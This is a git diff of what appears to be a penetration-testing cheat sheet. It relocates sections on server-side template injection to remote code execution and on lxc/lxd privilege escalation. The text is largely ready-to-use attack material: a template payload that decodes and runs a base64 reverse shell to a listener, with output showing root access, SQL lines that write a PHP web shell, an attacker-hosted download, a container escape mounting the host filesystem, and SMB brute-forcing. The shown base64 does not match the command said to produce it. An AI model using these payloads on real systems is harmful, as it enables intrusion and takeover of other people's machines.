@@ -65,6 +65,50 @@ mv evil.jpg evil.php.jpg
 ```
 
 ------------------------------------------------------------------------------------------------------------
+## Server Side Template Injection (SSTI) to RCE
+* At first check if the app is build in Python.
+* Try this, everywhere the app is taking input from the user.
+
+```python
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+```
+* if the app reflects the output as `49`.Then there might be a RCE possible.
+* now encode the payload in basse64.
+
+`input`
+```shell
+echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' | base64
+```
+`output`
+```
+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=
+```
+* now start a listener
+```
+nc -lvvp 4444
+```
+
+```python
+{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=${IFS}|base64${IFS}-d|bash').read()}}
+```
+* if everything works currectly. You should get a reverse shell.
+```shell
+nc -vv -lnp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.130.
+Ncat: Connection from 10.10.11.130:54434.
+sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+--------------------------------------------------------------------------------
 
 # Remote File Inclusion (RFI)
 
@@ -218,66 +262,7 @@ if(!$con)...
 '''''''''''''UNION SELECT '2
 %00
 ```
-
--------------------------------------------------------------------------------------------------------
-# lxc/lxd Privilege Escalation
-
-```
-git clone  https://github.com/saghul/lxd-alpine-builder.git
-cd lxd-alpine-builder
-./build-alpine
-```
-*upload the `apline-v3.10-x86_64-someting-.tar.gz` file from the attacker machine*
-```
-python -m SimpleHTTPServer
-```
-
-*download the `apline-v3.10-x86_64-someting.tar.gz` file to victim machine*
-```
-cd /tmp
-wget http://attacker-machine-ip:8000/apline-v3.10-x86_64-someting.tar.gz
-```
-
-*import the lxc image*
-```
-lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
-```
-
-*check the lxc image*
-```
-lxc image list
-```
-
-*run those commands on target machine*
-```
-lxc init
-lxc init myimage ignite -c security.privileged=true
-lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
-lxc start ignite
-lxc exec ignite /bin/sh
-id
-```
--------------------------------------------------------------------------------------------------
-# Scecific permission for specific user
-`no permission`
-```
-setfacl -m u:username:000 myfolder/myfile
-```
-`read-write-execute`
-```
-setfacl -m u:username:rwx myfolder/myfile
-```
-`readonly permission`
-```
-setfacl -m u:username:r myfolder/myfile
-```
-`read & write permission`
-```
-setfacl -m u:username:rw myfolder/myfile
-```
-
-
-
+------------------------------------------------------------------------------------------------------
 ## MySQL
 
 | **Command**   | **Description**   |
@@ -348,6 +333,62 @@ setfacl -m u:username:rw myfolder/myfile
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
 
+-------------------------------------------------------------------------------------------------------
+# lxc/lxd Privilege Escalation
+
+```
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+```
+*upload the `apline-v3.10-x86_64-someting-.tar.gz` file from the attacker machine*
+```
+python -m SimpleHTTPServer
+```
+
+*download the `apline-v3.10-x86_64-someting.tar.gz` file to victim machine*
+```
+cd /tmp
+wget http://attacker-machine-ip:8000/apline-v3.10-x86_64-someting.tar.gz
+```
+
+*import the lxc image*
+```
+lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
+```
+
+*check the lxc image*
+```
+lxc image list
+```
+
+*run those commands on target machine*
+```
+lxc init
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id
+```
+-------------------------------------------------------------------------------------------------
+# Scecific permission for specific user
+`no permission`
+```
+setfacl -m u:username:000 myfolder/myfile
+```
+`read-write-execute`
+```
+setfacl -m u:username:rwx myfolder/myfile
+```
+`readonly permission`
+```
+setfacl -m u:username:r myfolder/myfile
+```
+`read & write permission`
+```
+setfacl -m u:username:rw myfolder/myfile
+```
 
 --------------------------------------------------------------------------------------------------
 # SMB enumeration
@@ -448,45 +489,3 @@ map - Brute Force Accounts (be aware of account lockout!)
 nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt target-IP
 ```
 
-## SSTI to RCE
-* At first check if the app is build in Python.
-* Try this, everywhere the app is taking input from the user.
-
-```python
-{{7*7}}
-${7*7}
-<%= 7*7 %>
-${{7*7}}
-#{7*7}
-```
-* if the app reflects the output as `49`.Then there might be a RCE possible.
-* now encode the payload in basse64.
-
-`input`
-```shell
-echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' | base64
-```
-`output`
-```
-c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=
-```
-* now start a listener
-```
-nc -lvvp 4444
-```
-
-```python
-{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=${IFS}|base64${IFS}-d|bash').read()}}
-```
-* if everything works currectly. You should get a reverse shell.
-```shell
-nc -vv -lnp 4444
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::4444
-Ncat: Listening on 0.0.0.0:4444
-Ncat: Connection from 10.10.11.130.
-Ncat: Connection from 10.10.11.130:54434.
-sh: 0: can't access tty; job control turned off
-# id
-uid=0(root) gid=0(root) groups=0(root)
-```
